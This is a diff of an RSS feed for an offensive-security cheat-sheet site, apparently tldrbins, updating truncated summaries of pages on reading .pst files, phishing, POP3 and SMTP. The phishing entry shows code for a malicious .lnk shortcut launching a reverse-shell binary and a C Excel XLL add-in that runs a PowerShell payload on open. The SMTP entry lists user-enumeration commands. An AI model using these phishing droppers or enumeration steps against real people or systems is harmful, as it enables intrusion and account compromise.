@@ -19,28 +19,28 @@
       <link>https://tldrbins.github.io/microsoft_outlook/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/microsoft_outlook/</guid>
-      <description>Open .pst file Tool sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Use mutt mutt -Rf emails.mbox +--------------------------------------+ | Note: Answer No to create /root/Mail | | | | Arrow : Move to the email | | Enter : View email | | q : back | | q again : quit | +--------------------------------------+ Open .</description>
+      <description>Open email file .pst .msg Tools sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Install mutt sudo apt install mutt # Open in mutt terminal mutt -Rf emails.mbox +--------------------------------------+ | Note: Answer No to create /root/Mail | | | | Arrow : Move to the email | | Enter : View email | | q : back | | q again : quit | +--------------------------------------+ Tools # Install msgconvert sudo apt install libemail-outlook-message-perl # Install formail sudo apt install procmail Basic # Convert to .</description>
     </item>
     <item>
       <title>Phishing</title>
       <link>https://tldrbins.github.io/phishing/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/phishing/</guid>
-      <description>Abuse #1: Create a malicious .lnk $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut(&amp;#34;C:\ProgramData\Calculator.lnk&amp;#34;) $link.TargetPath = &amp;#34;C:\ProgramData\rev.exe&amp;#34; $link.Save() Abuse #2: Phishing with XLL (Excel) revshells.com&#xA;shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.</description>
+      <description>lnk xll hta scf odt pdf others $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut(&amp;#34;C:\ProgramData\Calculator.lnk&amp;#34;) $link.TargetPath = &amp;#34;C:\ProgramData\rev.exe&amp;#34; $link.Save() shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.</description>
     </item>
     <item>
       <title>POP3</title>
       <link>https://tldrbins.github.io/pop3/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/pop3/</guid>
-      <description> POP3 # Connect to POP3 mail server telnet 10.10.11.10 110 # Send cmd after +OK USER &amp;lt;USER&amp;gt; PASS &amp;lt;PASSWORD&amp;gt; # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit </description>
+      <description> Basic # Connect to POP3 mail server telnet 10.10.11.10 110 # Send cmd after +OK USER &amp;lt;USER&amp;gt; PASS &amp;lt;PASSWORD&amp;gt; # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit </description>
     </item>
     <item>
       <title>SMTP</title>
       <link>https://tldrbins.github.io/smtp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smtp/</guid>
-      <description>Simple Mail Debugging Server #!/usr/bin/env python3 import aiosmtpd.controller class CustomSMTPHandler: async def handle_DATA(self, server, session, envelope): print(f&amp;#34;[+] Received a mail.&amp;#34;) print(&amp;#34;=&amp;#34; * 50) print(envelope.content.decode()) print(&amp;#34;=&amp;#34; * 50) return &amp;#34;250 OK&amp;#34; handler = CustomSMTPHandler() server = aiosmtpd.controller.Controller(handler, hostname=&amp;#34;0.0.0.0&amp;#34;, port=25) server.start() print(&amp;#34;[*] Listening on 0.0.0.0:25&amp;#34;) input(&amp;#34;[*] Server started. Press Return to quit.\n&amp;#34;) server.stop() User Enum nmap script nmap -p 25 --script=smtp-enum-users &amp;lt;TARGET&amp;gt; smtp-user-enum # Use RCPT smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t &amp;lt;TARGET&amp;gt; # Use VRFY smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.</description>
+      <description>Simple Mail Debugging Server #!/usr/bin/env python3 import aiosmtpd.controller class CustomSMTPHandler: async def handle_DATA(self, server, session, envelope): print(f&amp;#34;[+] Received a mail.&amp;#34;) print(&amp;#34;=&amp;#34; * 50) print(envelope.content.decode()) print(&amp;#34;=&amp;#34; * 50) return &amp;#34;250 OK&amp;#34; handler = CustomSMTPHandler() server = aiosmtpd.controller.Controller(handler, hostname=&amp;#34;0.0.0.0&amp;#34;, port=25) server.start() print(&amp;#34;[*] Listening on 0.0.0.0:25&amp;#34;) input(&amp;#34;[*] Server started. Press Return to quit.\n&amp;#34;) server.stop() Users Enum nmap script smtp-user-enum nmap -p 25 --script=smtp-enum-users &amp;lt;TARGET&amp;gt; # Use RCPT smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t &amp;lt;TARGET&amp;gt; # Use VRFY smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.</description>
     </item>
   </channel>
 </rss>
